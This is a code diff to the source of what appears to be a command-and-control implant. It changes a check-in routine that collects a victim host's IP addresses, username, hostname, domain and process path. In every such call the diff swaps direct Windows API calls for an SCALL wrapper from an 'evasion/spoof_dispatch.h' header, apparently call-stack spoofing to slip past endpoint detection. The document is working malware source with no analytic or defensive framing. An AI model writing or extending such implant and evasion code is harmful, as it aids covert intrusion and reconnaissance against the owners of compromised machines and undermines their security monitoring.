@@ -3,6 +3,7 @@
 #include <package.h>
 #include <strings.h>
 #include <stackstr.h>
+#include <evasion/spoof_dispatch.h>
 
 using namespace stardust;
 using namespace starburst;
@@ -52,7 +53,7 @@ auto declfn starburst::build_checkin_package(
     // IPs - collect real addresses via GetAdaptersInfo
     {
         STK_IPHLPAPI(_n);
-        auto h_iphlpapi = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA( _n ) );
+        auto h_iphlpapi = reinterpret_cast<HMODULE>( SCALL( inst, kernel32.LoadLibraryA, _n ) );
 
         uint32_t ip_count = 0;
         char ip_list[16][16];
@@ -118,10 +119,10 @@ auto declfn starburst::build_checkin_package(
     {
         wchar_t username_w[128] = { 0 };
         DWORD   usize = 128;
-        inst.advapi32.GetUserNameW( username_w, &usize );
+        SCALL( inst, advapi32.GetUserNameW, username_w, &usize );
 
         char username[128] = { 0 };
-        inst.kernel32.WideCharToMultiByte( CP_ACP, 0, username_w, -1, username, 128, nullptr, nullptr );
+        SCALL( inst, kernel32.WideCharToMultiByte, CP_ACP, 0, username_w, -1, username, 128, nullptr, nullptr );
         package_add_string( inst, pkg, username );
     }
 
@@ -129,10 +130,10 @@ auto declfn starburst::build_checkin_package(
     {
         wchar_t hostname_w[128] = { 0 };
         DWORD   hsize = 128;
-        inst.kernel32.GetComputerNameW( hostname_w, &hsize );
+        SCALL( inst, kernel32.GetComputerNameW, hostname_w, &hsize );
 
         char hostname[128] = { 0 };
-        inst.kernel32.WideCharToMultiByte( CP_ACP, 0, hostname_w, -1, hostname, 128, nullptr, nullptr );
+        SCALL( inst, kernel32.WideCharToMultiByte, CP_ACP, 0, hostname_w, -1, hostname, 128, nullptr, nullptr );
         package_add_string( inst, pkg, hostname );
     }
 
@@ -150,13 +151,13 @@ auto declfn starburst::build_checkin_package(
     // domain - try environment variable
     {
         wchar_t domain_w[128] = { 0 };
-        inst.kernel32.GetEnvironmentVariableW(
+        SCALL( inst, kernel32.GetEnvironmentVariableW,
             symbol<LPCWSTR>( L"USERDOMAIN" ),
             domain_w, 128
         );
 
         char domain[128] = { 0 };
-        inst.kernel32.WideCharToMultiByte( CP_ACP, 0, domain_w, -1, domain, 128, nullptr, nullptr );
+        SCALL( inst, kernel32.WideCharToMultiByte, CP_ACP, 0, domain_w, -1, domain, 128, nullptr, nullptr );
         package_add_string( inst, pkg, domain );
     }
 
@@ -170,7 +171,7 @@ auto declfn starburst::build_checkin_package(
     {
         wchar_t* img_path = NtCurrentPeb()->ProcessParameters->ImagePathName.Buffer;
         char proc_name[256] = { 0 };
-        inst.kernel32.WideCharToMultiByte( CP_ACP, 0, img_path, -1, proc_name, 256, nullptr, nullptr );
+        SCALL( inst, kernel32.WideCharToMultiByte, CP_ACP, 0, img_path, -1, proc_name, 256, nullptr, nullptr );
         package_add_string( inst, pkg, proc_name );
     }
 
